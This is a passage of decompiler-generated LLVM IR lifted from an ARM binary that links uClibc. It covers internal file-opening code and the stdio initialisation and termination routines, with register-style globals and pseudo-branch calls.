  %v0_e360 = phi i32 [ %v0_e360.pre, %dec_label_pc_e344.dec_label_pc_e35c_crit_edge ], [ %v0_e338, %dec_label_pc_e338 ]
  %v0_e35c = phi i32 [ %v0_e35c.pre, %dec_label_pc_e344.dec_label_pc_e35c_crit_edge ], [ %v1_e338, %dec_label_pc_e338 ]
  %v1_e35c = and i32 %v0_e35c, 131072
  store i32 %v1_e35c, i32* %r3.global-to-local, align 4
  %v2_e360 = or i32 %v1_e35c, %v0_e360
  store i32 %v2_e360, i32* @r4, align 4
  br label %dec_label_pc_e38c

dec_label_pc_e368:                                ; preds = %dec_label_pc_e310
  %v7_e368 = icmp eq i32 %v0_e368, -1
  %v0_e374.pre = load i32, i32* @r4, align 4
  br i1 %v7_e368, label %dec_label_pc_e368._crit_edge, label %bb38

bb38:                                             ; preds = %dec_label_pc_e368
  %v2_e36c = or i32 %v0_e374.pre, ptrtoint (i32* @global_var_20000.254 to i32)
  store i32 %v2_e36c, i32* @r4, align 4
  br label %dec_label_pc_e368._crit_edge

dec_label_pc_e368._crit_edge:                     ; preds = %dec_label_pc_e368, %bb38
  %v0_e374 = phi i32 [ %v2_e36c, %bb38 ], [ %v0_e374.pre, %dec_label_pc_e368 ]
  %v0_e370 = load i32, i32* @r6, align 4
  store i32 %v0_e370, i32* %r0.global-to-local, align 4
  store i32 %v0_e374, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_e37c = call i32 @__GI_open(i32 %v0_e370, i32 %v0_e374)
  store i32 %v2_e37c, i32* %r0.global-to-local, align 4
  %v1_e380 = icmp slt i32 %v2_e37c, 0
  %v1_e384 = load i32, i32* @sb, align 4
  %v2_e384 = add i32 %v1_e384, 4
  %v3_e384 = inttoptr i32 %v2_e384 to i32*
  store i32 %v2_e37c, i32* %v3_e384, align 4
  br i1 %v1_e380, label %dec_label_pc_e2a4, label %.dec_label_pc_e38c_crit_edge

.dec_label_pc_e38c_crit_edge:                     ; preds = %dec_label_pc_e368._crit_edge
  %v0_e390.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e38c

dec_label_pc_e38c:                                ; preds = %.dec_label_pc_e38c_crit_edge, %dec_label_pc_e35c
  %v0_e3a8 = phi i32 [ %v0_e390.pre, %.dec_label_pc_e38c_crit_edge ], [ %v2_e360, %dec_label_pc_e35c ]
  %v0_e38c = load i32, i32* @sb, align 4
  %v1_e38c = inttoptr i32 %v0_e38c to i16*
  %v2_e38c = load i16, i16* %v1_e38c, align 2
  %v3_e38c = zext i16 %v2_e38c to i32
  %v1_e390 = urem i32 %v0_e3a8, 4
  %v1_e394 = and i32 %v0_e3a8, 1024
  %v1_e398 = and i32 %v3_e38c, 8192
  %v1_e39c = add nuw nsw i32 %v1_e390, 1
  %v2_e3a0 = or i32 %v1_e398, %v1_e394
  store i32 %v2_e3a0, i32* %r3.global-to-local, align 4
  %v1_e3a4 = xor i32 %v1_e39c, 3
  store i32 %v1_e3a4, i32* %r1.global-to-local, align 4
  %v1_e3a8 = and i32 %v0_e3a8, ptrtoint (i32* @global_var_20000.254 to i32)
  store i32 %v1_e3a8, i32* %r2.global-to-local, align 4
  %v2_e3a8 = icmp eq i32 %v1_e3a8, 0
  %v1_e3ac = add i32 %v0_e38c, 4
  %v2_e3ac = inttoptr i32 %v1_e3ac to i32*
  %v3_e3ac = load i32, i32* %v2_e3ac, align 4
  store i32 %v3_e3ac, i32* @r5, align 4
  br i1 %v2_e3a8, label %bb40, label %bb39

bb39:                                             ; preds = %dec_label_pc_e38c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_e38c, %bb39
  %v0_e3b8 = phi i32 [ 0, %dec_label_pc_e38c ], [ 32768, %bb39 ]
  %v4_e3b4 = mul nuw nsw i32 %v1_e3a4, 16
  %v5_e3b4 = or i32 %v2_e3a0, %v4_e3b4
  store i32 %v5_e3b4, i32* %r3.global-to-local, align 4
  %v2_e3b8 = or i32 %v0_e3b8, %v5_e3b4
  store i32 %v2_e3b8, i32* %r2.global-to-local, align 4
  %v8_e3bc = icmp eq i32 %v3_e3ac, 2147483647
  %v1_e3c0 = trunc i32 %v2_e3b8 to i16
  store i16 %v1_e3c0, i16* %v1_e38c, align 2
  br i1 %v8_e3bc, label %dec_label_pc_e3f0, label %dec_label_pc_e3c8

dec_label_pc_e3c8:                                ; preds = %bb40
  %v0_e3c8 = call i32 @__GI___errno_location()
  store i32 %v0_e3c8, i32* @r4, align 4
  %v0_e3d0 = load i32, i32* @r5, align 4
  store i32 %v0_e3d0, i32* @r0, align 4
  %v1_e3d4 = inttoptr i32 %v0_e3c8 to i32*
  %v2_e3d4 = load i32, i32* %v1_e3d4, align 4
  store i32 %v2_e3d4, i32* @r5, align 4
  %v1_e3d8 = call i32 @isatty(i32 %v0_e3d0)
  store i32 %v1_e3d8, i32* %r0.global-to-local, align 4
  %v2_e3dc = icmp eq i32 %v1_e3d8, 0
  br i1 %v2_e3dc, label %.thread7, label %bb41

bb41:                                             ; preds = %dec_label_pc_e3c8
  %v1_e3e0 = load i32, i32* @sb, align 4
  %v2_e3e0 = inttoptr i32 %v1_e3e0 to i16*
  %v3_e3e0 = load i16, i16* %v2_e3e0, align 2
  %v4_e3e0 = zext i16 %v3_e3e0 to i32
  %v2_e3e4 = or i32 %v4_e3e0, 256
  store i32 %v2_e3e4, i32* %r3.global-to-local, align 4
  %v2_e3e8 = trunc i32 %v2_e3e4 to i16
  store i16 %v2_e3e8, i16* %v2_e3e0, align 2
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_e3c8, %bb41
  %v0_e3ec = load i32, i32* @r5, align 4
  %v1_e3ec = load i32, i32* @r4, align 4
  %v2_e3ec = inttoptr i32 %v1_e3ec to i32*
  store i32 %v0_e3ec, i32* %v2_e3ec, align 4
  br label %dec_label_pc_e3f0

dec_label_pc_e3f0:                                ; preds = %bb40, %.thread7
  %v0_e3f0 = load i32, i32* @sb, align 4
  %v1_e3f0 = add i32 %v0_e3f0, 8
  %v2_e3f0 = inttoptr i32 %v1_e3f0 to i32*
  %v3_e3f0 = load i32, i32* %v2_e3f0, align 4
  store i32 %v3_e3f0, i32* %r3.global-to-local, align 4
  %v2_e3f4 = icmp eq i32 %v3_e3f0, 0
  br i1 %v2_e3f4, label %dec_label_pc_e3fc, label %bb42

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e3f0
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_e400 = call i32 @malloc(i32 4096)
  store i32 %v1_e400, i32* %r0.global-to-local, align 4
  %v2_e404 = icmp eq i32 %v1_e400, 0
  %v1_e414.pre = load i32, i32* @sb, align 4
  br i1 %v2_e404, label %.thread11, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_e3fc
  %v2_e408 = inttoptr i32 %v1_e414.pre to i16*
  %v3_e408 = load i16, i16* %v2_e408, align 2
  %v4_e408 = zext i16 %v3_e408 to i32
  %v2_e40c = add i32 %v1_e400, 4096
  store i32 %v2_e40c, i32* %r2.global-to-local, align 4
  %v2_e410 = or i32 %v4_e408, 16384
  store i32 %v2_e410, i32* %r3.global-to-local, align 4
  %v2_e414 = add i32 %v1_e414.pre, 8
  %v3_e414 = inttoptr i32 %v2_e414 to i32*
  store i32 %v1_e400, i32* %v3_e414, align 4
  %v1_e418 = load i32, i32* %r2.global-to-local, align 4
  %v2_e418 = load i32, i32* @sb, align 4
  %v3_e418 = add i32 %v2_e418, 12
  %v4_e418 = inttoptr i32 %v3_e418 to i32*
  store i32 %v1_e418, i32* %v4_e418, align 4
  %v1_e41c = load i32, i32* %r3.global-to-local, align 4
  %v2_e41c = trunc i32 %v1_e41c to i16
  %v3_e41c = load i32, i32* @sb, align 4
  %v4_e41c = inttoptr i32 %v3_e41c to i16*
  store i16 %v2_e41c, i16* %v4_e41c, align 2
  br label %bb42

.thread11:                                        ; preds = %dec_label_pc_e3fc
  %v2_e41421 = add i32 %v1_e414.pre, 8
  %v3_e41422 = inttoptr i32 %v2_e41421 to i32*
  store i32 0, i32* %v3_e41422, align 4
  %v2_e420 = load i32, i32* @sb, align 4
  %v3_e420 = add i32 %v2_e420, 12
  %v4_e420 = inttoptr i32 %v3_e420 to i32*
  store i32 0, i32* %v4_e420, align 4
  br label %bb42

bb42:                                             ; preds = %.thread10, %dec_label_pc_e3f0, %.thread11
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_e42c = load i32, i32* @fp, align 4
  %v2_e42c = add i32 %v0_e42c, 60
  %v3_e42c = inttoptr i32 %v2_e42c to i32*
  %v4_e42c = load i32, i32* %v3_e42c, align 4
  store i32 %v4_e42c, i32* %r3.global-to-local, align 4
  %v2_e430 = load i32, i32* @sb, align 4
  %v3_e430 = add i32 %v2_e430, 2
  %v4_e430 = inttoptr i32 %v3_e430 to i8*
  store i8 0, i8* %v4_e430, align 1
  %v0_e434 = load i32, i32* @sb, align 4
  %v1_e434 = inttoptr i32 %v0_e434 to i16*
  %v2_e434 = load i16, i16* %v1_e434, align 2
  %v3_e434 = zext i16 %v2_e434 to i32
  store i32 %v3_e434, i32* @r2, align 4
  %v0_e438 = load i32, i32* %r3.global-to-local, align 4
  %v1_e438 = inttoptr i32 %v0_e438 to i32*
  %v2_e438 = load i32, i32* %v1_e438, align 4
  store i32 %v2_e438, i32* %r1.global-to-local, align 4
  %v1_e43c = add i32 %v0_e434, 8
  %v2_e43c = inttoptr i32 %v1_e43c to i32*
  %v3_e43c = load i32, i32* %v2_e43c, align 4
  store i32 %v3_e43c, i32* %r3.global-to-local, align 4
  %v1_e440 = and i32 %v3_e434, 8192
  %v2_e440 = icmp eq i32 %v1_e440, 0
  %v2_e444 = add i32 %v0_e434, 20
  %v3_e444 = inttoptr i32 %v2_e444 to i32*
  store i32 %v3_e43c, i32* %v3_e444, align 4
  %v0_e448 = load i32, i32* %r0.global-to-local, align 4
  %v1_e448 = load i32, i32* @sb, align 4
  %v2_e448 = add i32 %v1_e448, 44
  %v3_e448 = inttoptr i32 %v2_e448 to i32*
  store i32 %v0_e448, i32* %v3_e448, align 4
  %v0_e44c = load i32, i32* %r1.global-to-local, align 4
  %v1_e44c = load i32, i32* @sb, align 4
  %v2_e44c = add i32 %v1_e44c, 52
  %v3_e44c = inttoptr i32 %v2_e44c to i32*
  store i32 %v0_e44c, i32* %v3_e44c, align 4
  %v0_e450 = load i32, i32* %r3.global-to-local, align 4
  %v1_e450 = load i32, i32* @sb, align 4
  %v2_e450 = add i32 %v1_e450, 24
  %v3_e450 = inttoptr i32 %v2_e450 to i32*
  store i32 %v0_e450, i32* %v3_e450, align 4
  %v0_e454 = load i32, i32* %r3.global-to-local, align 4
  %v1_e454 = load i32, i32* @sb, align 4
  %v2_e454 = add i32 %v1_e454, 28
  %v3_e454 = inttoptr i32 %v2_e454 to i32*
  store i32 %v0_e454, i32* %v3_e454, align 4
  %v0_e458 = load i32, i32* %r3.global-to-local, align 4
  %v1_e458 = load i32, i32* @sb, align 4
  %v2_e458 = add i32 %v1_e458, 16
  %v3_e458 = inttoptr i32 %v2_e458 to i32*
  store i32 %v0_e458, i32* %v3_e458, align 4
  br i1 %v2_e440, label %dec_label_pc_e514, label %dec_label_pc_e460

dec_label_pc_e460:                                ; preds = %bb42
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_e464 = load i32, i32* @fp, align 4
  %v2_e464 = add i32 %v0_e464, 36
  %v3_e464 = inttoptr i32 %v2_e464 to i32*
  %v4_e464 = load i32, i32* %v3_e464, align 4
  store i32 %v4_e464, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_e46c = add i32 %v0_e464, 112
  %v3_e46c = inttoptr i32 %v2_e46c to i32*
  %v4_e46c = load i32, i32* %v3_e46c, align 4
  store i32 %v4_e46c, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_e474 = ptrtoint i32* %stack_var_-56 to i32
  %v2_e478 = add i32 %v0_e464, 76
  %v3_e478 = inttoptr i32 %v2_e478 to i32*
  %v4_e478 = load i32, i32* %v3_e478, align 4
  store i32 %v4_e464, i32* %r1.global-to-local, align 4
  store i32 %v4_e46c, i32* %r2.global-to-local, align 4
  store i32 %v2_e474, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_e478)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_e494 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e494, i32* %r0.global-to-local, align 4
  %v0_e498 = load i32, i32* @fp, align 4
  %v2_e498 = add i32 %v0_e498, 16
  %v3_e498 = inttoptr i32 %v2_e498 to i32*
  %v4_e498 = load i32, i32* %v3_e498, align 4
  call void @__pseudo_branch(i32 %v4_e498)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_e4a8 = load i32, i32* @fp, align 4
  %v2_e4a8 = add i32 %v0_e4a8, 100
  %v3_e4a8 = inttoptr i32 %v2_e4a8 to i32*
  %v4_e4a8 = load i32, i32* %v3_e4a8, align 4
  store i32 %v4_e4a8, i32* %r4.global-to-local, align 4
  %v0_e4ac = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_e4ac, i32* %r1.global-to-local, align 4
  store i32 %v4_e4a8, i32* %r2.global-to-local, align 4
  store i32 %v2_e264, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_e478)
  store i32 %v4_e4a8, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_e498)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_e4d0 = load i32, i32* @fp, align 4
  %v2_e4d0 = add i32 %v0_e4d0, 48
  %v3_e4d0 = inttoptr i32 %v2_e4d0 to i32*
  %v4_e4d0 = load i32, i32* %v3_e4d0, align 4
  store i32 %v4_e4d0, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_e4d8 = inttoptr i32 %v4_e4d0 to i32*
  %v2_e4d8 = load i32, i32* %v1_e4d8, align 4
  store i32 %v2_e4d8, i32* @r2, align 4
  store i32 %v2_e264, i32* %r0.global-to-local, align 4
  %v1_e4e0 = load i32, i32* @sb, align 4
  %v2_e4e0 = add i32 %v1_e4e0, 32
  %v3_e4e0 = inttoptr i32 %v2_e4e0 to i32*
  store i32 %v2_e4d8, i32* %v3_e4e0, align 4
  %v0_e4e4 = load i32, i32* @fp, align 4
  %v1_e4e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_e4e4 = add i32 %v1_e4e4, %v0_e4e4
  %v3_e4e4 = inttoptr i32 %v2_e4e4 to i32*
  %v4_e4e4 = load i32, i32* %v3_e4e4, align 4
  store i32 %v4_e4e4, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_e4ec = load i32, i32* @sb, align 4
  %v1_e4ec = load i32, i32* @ip, align 4
  %v2_e4ec = inttoptr i32 %v1_e4ec to i32*
  store i32 %v0_e4ec, i32* %v2_e4ec, align 4
  call void @__pseudo_branch(i32 %v4_e4e4)
  store i32 %v2_e474, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_e4e4)
  br label %dec_label_pc_e514

dec_label_pc_e510:                                ; preds = %dec_label_pc_e2a4, %dec_label_pc_e290, %dec_label_pc_e2b0
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_e514

dec_label_pc_e514:                                ; preds = %bb42, %dec_label_pc_e2e8, %dec_label_pc_e460, %dec_label_pc_e510
  %v0_e514 = load i32, i32* @sb, align 4
  store i32 %v0_e514, i32* %r0.global-to-local, align 4
  %v2_e51c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_e51c, i32* @r4, align 4
  store i32 %v6_e250, i32* @r5, align 4
  store i32 %v9_e250, i32* @r6, align 4
  store i32 %v18_e250, i32* @sb, align 4
  store i32 %v24_e250, i32* @fp, align 4
  ret i32 %v0_e514

; uselistorder directives
  uselistorder i32 %v1_e414.pre, { 2, 1, 0 }
  uselistorder i32 %v0_e3a8, { 1, 2, 0 }
  uselistorder i32 %v0_e374, { 1, 0 }
  uselistorder i32 %v1_e338, { 1, 0 }
  uselistorder i32 %v0_e338, { 1, 0 }
  uselistorder i32 %v1_e320, { 1, 0, 2 }
  uselistorder i32 %v1_e2d8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 10, 9, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20 }
  uselistorder i32 16384, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32)* @__GI_open, { 1, 0 }
  uselistorder i32 131072, { 1, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 5, 6, 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_e514, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_e510, { 2, 0, 1 }
  uselistorder label %bb42, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e3f0, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %dec_label_pc_e368._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_e310, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %dec_label_pc_e2c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e290, { 1, 2, 0 }
}

define i32 @function_e528(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e528:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_e528 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e528, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_e528
  %v3_e530 = and i32 %arg4, %arg3
  %v2_e534 = trunc i32 %v3_e530 to i16
  %v4_e534 = inttoptr i32 %v3_e530 to i16*
  store i16 %v2_e534, i16* %v4_e534, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_e528, %bb
  %v10_e554 = phi i32 [ %tmp, %dec_label_pc_e528 ], [ 0, %bb ]
  ret i32 %v10_e554

; uselistorder directives
  uselistorder i32 %v3_e530, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  %v0_e55c = call i32 @__GI___errno_location()
  store i32 %v0_e55c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_e568 = inttoptr i32 %v0_e55c to i32*
  %v2_e568 = load i32, i32* %v1_e568, align 4
  store i32 %v2_e568, i32* @r6, align 4
  %v1_e56c = call i32 @isatty(i32 0)
  %v2_e574 = icmp eq i32 %v1_e56c, 0
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r4, align 4
  br i1 %v2_e574, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_e580 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 484) to i16*), align 4
  %v7_e580 = zext i16 %v5_e580 to i32
  %v2_e584 = xor i32 %v7_e580, 256
  store i32 %v2_e584, i32* @r3, align 4
  %v2_e588 = trunc i32 %v2_e584 to i16
  store i16 %v2_e588, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 484) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_e590 = call i32 @isatty(i32 1)
  %v2_e594 = icmp eq i32 %v1_e590, 0
  br i1 %v2_e594, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_e59c = load i32, i32* @r4, align 4
  %v2_e5a0 = add i32 %v1_e59c, 564
  %v3_e5a0 = inttoptr i32 %v2_e5a0 to i16*
  %v4_e5a0 = load i16, i16* %v3_e5a0, align 2
  %v2_e5a4 = xor i16 %v4_e5a0, 256
  store i16 %v2_e5a4, i16* %v3_e5a0, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v0_e5ac = load i32, i32* @r6, align 4
  %v1_e5ac = load i32, i32* @r5, align 4
  %v2_e5ac = inttoptr i32 %v1_e5ac to i32*
  store i32 %v0_e5ac, i32* %v2_e5ac, align 4
  ret i32 %v1_e590

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37328), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_e5dc = call i32 @memcpy()
  ret i32 %v0_e5dc
}

define i32 @_stdio_term(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e5f4 = load i32, i32* @r4, align 4
  store i32 %v3_e5f4, i32* %stack_var_-24, align 4
  store i32 100, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r6.global-to-local, align 4
  %v4_e604 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 100) to i32*), align 4
  store i32 %v4_e604, i32* @r0, align 4
  %v1_e608 = call i32 @__stdio_init_mutex(i32 %v4_e604)
  store i32 %v1_e608, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_e610 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 112) to i32*), align 4
  store i32 %v4_e610, i32* @r0, align 4
  %v1_e614 = call i32 @__stdio_init_mutex(i32 %v4_e610)
  store i32 %v1_e614, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_e61c = load i32, i32* %r6.global-to-local, align 4
  %v2_e61c = add i32 %v0_e61c, 48
  %v3_e61c = inttoptr i32 %v2_e61c to i32*
  %v4_e61c = load i32, i32* %v3_e61c, align 4
  store i32 %v4_e61c, i32* %r3.global-to-local, align 4
  store i32 44, i32* %r8.global-to-local, align 4
  %v1_e624 = inttoptr i32 %v4_e61c to i32*
  %v2_e624 = load i32, i32* %v1_e624, align 4
  store i32 %v2_e624, i32* @r4, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v1_e6705 = add i32 %v2_e624, 56
  store i32 %v1_e6705, i32* @r5, align 4
  %v2_e6747 = icmp eq i32 %v2_e624, 0
  store i32 %v1_e6705, i32* %r0.global-to-local, align 4
  br i1 %v2_e6747, label %dec_label_pc_e680, label %dec_label_pc_e630

dec_label_pc_e630:                                ; preds = %entry, %dec_label_pc_e664.dec_label_pc_e630_crit_edge
  %v1_e630 = phi i32 [ %v1_e630.pre, %dec_label_pc_e664.dec_label_pc_e630_crit_edge ], [ 44, %entry ]
  %v0_e630 = phi i32 [ %v0_e684.pre, %dec_label_pc_e664.dec_label_pc_e630_crit_edge ], [ %v0_e61c, %entry ]
  %v2_e630 = add i32 %v0_e630, %v1_e630
  %v3_e630 = inttoptr i32 %v2_e630 to i32*
  %v4_e630 = load i32, i32* %v3_e630, align 4
  store i32 %v4_e630, i32* @ip, align 4
  store i32 58940, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_e630)
  %v0_e63c = load i32, i32* %r0.global-to-local, align 4
  %v2_e63c = icmp eq i32 %v0_e63c, 0
  %v0_e640 = load i32, i32* @r5, align 4
  store i32 %v0_e640, i32* @r0, align 4
  br i1 %v2_e63c, label %dec_label_pc_e664, label %dec_label_pc_e648

dec_label_pc_e648:                                ; preds = %dec_label_pc_e630
  %v0_e648 = load i32, i32* @r4, align 4
  %v1_e648 = add i32 %v0_e648, 8
  %v2_e648 = inttoptr i32 %v1_e648 to i32*
  %v3_e648 = load i32, i32* %v2_e648, align 4
  store i32 %v3_e648, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v2_e650 = add i32 %v0_e648, 20
  %v3_e650 = inttoptr i32 %v2_e650 to i32*
  store i32 %v3_e648, i32* %v3_e650, align 4
  %v0_e654 = load i32, i32* %r2.global-to-local, align 4
  %v1_e654 = trunc i32 %v0_e654 to i16
  %v2_e654 = load i32, i32* @r4, align 4
  %v3_e654 = inttoptr i32 %v2_e654 to i16*
  store i16 %v1_e654, i16* %v3_e654, align 2
  %v0_e658 = load i32, i32* %r3.global-to-local, align 4
  %v1_e658 = load i32, i32* @r4, align 4
  %v2_e658 = add i32 %v1_e658, 24
  %v3_e658 = inttoptr i32 %v2_e658 to i32*
  store i32 %v0_e658, i32* %v3_e658, align 4
  %v0_e65c = load i32, i32* %r3.global-to-local, align 4
  %v1_e65c = load i32, i32* @r4, align 4
  %v2_e65c = add i32 %v1_e65c, 28
  %v3_e65c = inttoptr i32 %v2_e65c to i32*
  store i32 %v0_e65c, i32* %v3_e65c, align 4
  %v0_e660 = load i32, i32* %r3.global-to-local, align 4
  %v1_e660 = load i32, i32* @r4, align 4
  %v2_e660 = add i32 %v1_e660, 16
  %v3_e660 = inttoptr i32 %v2_e660 to i32*
  store i32 %v0_e660, i32* %v3_e660, align 4
  br label %dec_label_pc_e664

dec_label_pc_e664:                                ; preds = %dec_label_pc_e630, %dec_label_pc_e648
  %v0_e664 = load i32, i32* %r7.global-to-local, align 4
  %v1_e664 = load i32, i32* @r4, align 4
  %v2_e664 = add i32 %v1_e664, 52
  %v3_e664 = inttoptr i32 %v2_e664 to i32*
  store i32 %v0_e664, i32* %v3_e664, align 4
  %v1_e668 = call i32 @__stdio_init_mutex(i32 %v0_e640)
  store i32 %v1_e668, i32* %r0.global-to-local, align 4
  %v0_e66c = load i32, i32* @r4, align 4
  %v1_e66c = add i32 %v0_e66c, 32
  %v2_e66c = inttoptr i32 %v1_e66c to i32*
  %v3_e66c = load i32, i32* %v2_e66c, align 4
  store i32 %v3_e66c, i32* @r4, align 4
  %v1_e670 = add i32 %v3_e66c, 56
  store i32 %v1_e670, i32* @r5, align 4
  %v2_e674 = icmp eq i32 %v3_e66c, 0
  store i32 %v1_e670, i32* %r0.global-to-local, align 4
  %v0_e684.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_e674, label %dec_label_pc_e680, label %dec_label_pc_e664.dec_label_pc_e630_crit_edge

dec_label_pc_e664.dec_label_pc_e630_crit_edge:    ; preds = %dec_label_pc_e664
  %v1_e630.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e630

dec_label_pc_e680:                                ; preds = %dec_label_pc_e664, %entry
  %v1_e6b014 = phi i32 [ %v1_e6705, %entry ], [ %v1_e670, %dec_label_pc_e664 ]
  %v0_e684 = phi i32 [ %v0_e61c, %entry ], [ %v0_e684.pre, %dec_label_pc_e664 ]
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_e684 = add i32 %v0_e684, 48
  %v3_e684 = inttoptr i32 %v2_e684 to i32*
  %v4_e684 = load i32, i32* %v3_e684, align 4
  store i32 %v4_e684, i32* %r3.global-to-local, align 4
  %storemerge.in1 = inttoptr i32 %v4_e684 to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %r4.global-to-local, align 4
  %v2_e6a44 = icmp eq i32 %storemerge2, 0
  br i1 %v2_e6a44, label %dec_label_pc_e6ac, label %dec_label_pc_e690

dec_label_pc_e690:                                ; preds = %dec_label_pc_e680, %dec_label_pc_e6a4
  %v1_e698 = phi i32 [ %storemerge, %dec_label_pc_e6a4 ], [ %storemerge2, %dec_label_pc_e680 ]
  %v1_e690 = inttoptr i32 %v1_e698 to i16*
  %v2_e690 = load i16, i16* %v1_e690, align 2
  %v3_e690 = zext i16 %v2_e690 to i32
  store i32 %v3_e690, i32* %r3.global-to-local, align 4
  %v1_e694 = and i32 %v3_e690, 64
  %v2_e694 = icmp eq i32 %v1_e694, 0
  br i1 %v2_e694, label %dec_label_pc_e6a4, label %bb

bb:                                               ; preds = %dec_label_pc_e690
  store i32 %v1_e698, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e6a4

dec_label_pc_e6a4:                                ; preds = %dec_label_pc_e690, %bb
  %v1_e69c = xor i1 %v2_e694, true
  call void @__pseudo_cond_branch(i1 %v1_e69c, i32 ptrtoint (i32* @global_var_e6c8.274 to i32))
  %v0_e6a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_e6a0 = add i32 %v0_e6a0, 32
  %storemerge.in = inttoptr i32 %v1_e6a0 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_e6a4 = icmp eq i32 %storemerge, 0
  br i1 %v2_e6a4, label %dec_label_pc_e6a4.dec_label_pc_e6ac_crit_edge, label %dec_label_pc_e690

dec_label_pc_e6a4.dec_label_pc_e6ac_crit_edge:    ; preds = %dec_label_pc_e6a4
  %v1_e6b0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e6ac

dec_label_pc_e6ac:                                ; preds = %dec_label_pc_e6a4.dec_label_pc_e6ac_crit_edge, %dec_label_pc_e680
